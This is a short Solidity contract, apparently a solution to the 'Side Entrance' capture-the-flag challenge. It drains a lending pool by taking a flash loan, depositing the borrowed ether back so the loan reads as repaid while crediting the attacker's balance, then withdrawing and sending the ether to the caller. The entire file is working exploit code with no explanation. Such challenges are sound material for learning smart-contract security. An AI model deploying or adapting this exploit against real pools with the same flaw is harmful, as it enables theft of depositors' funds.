// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./SideEntranceLenderPool.sol";

contract SideExploit {
    uint256 public amount = 0;
    SideEntranceLenderPool public pool;

    function runExploit(SideEntranceLenderPool _pool, uint256 _amount) external {
      amount = _amount;
      pool = _pool;
      pool.flashLoan(amount);
      pool.withdraw();
      payable(msg.sender).transfer(amount);
    }

    function execute() external payable {
      pool.deposit{value: amount}();
    }

    fallback() external payable {}
}